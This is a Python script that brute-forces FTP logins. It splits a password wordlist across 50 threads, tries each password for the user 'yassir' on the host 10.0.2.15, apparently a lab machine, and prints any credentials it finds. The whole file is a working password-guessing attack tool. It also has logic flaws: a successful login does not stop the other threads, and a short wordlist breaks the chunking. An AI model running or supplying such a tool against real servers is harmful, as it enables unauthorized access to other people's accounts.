import sys
from ftplib import FTP
import threading
from tqdm import tqdm

class BruteForceThread(threading.Thread):
    def __init__(self, target, username, wordlist_chunk):
        super().__init__()
        self.target = target
        self.username = username
        self.wordlist_chunk = wordlist_chunk

    def run(self):
        for password in self.wordlist_chunk:
            password = password.strip()
            if ftp_login(self.target, self.username, password):
                return

def ftp_login(target, username, password):
    try:
        ftp = FTP(target)
        ftp.login(username, password)
        ftp.quit()
        print("\n[!] Credentials have found.")
        print("\n[!] Username : {}".format(username))
        print("\n[!] Password : {}".format(password))
        sys.exit(0)
    except:
        pass

def brute_force(target, username, wordlist):
    try:
        with open(wordlist, "r") as wordlist_file:
            words = wordlist_file.readlines()
            chunk_size = len(words) // 50  # Diviser la liste de mots de passe en 50 chunks
            wordlist_chunks = [words[i:i+chunk_size] for i in range(0, len(words), chunk_size)]

            threads = []
            for chunk in wordlist_chunks:
                thread = BruteForceThread(target, username, chunk)
                thread.start()
                threads.append(thread)

            for thread in threads:
                thread.join()

    except FileNotFoundError:
        print("\n[-] There is no such wordlist file. \n")
        sys.exit(1)

    print("\n[-] Brute force finished. \n")

brute_force("10.0.2.15", "yassir", "/usr/share/wordlists/fasttrack.txt")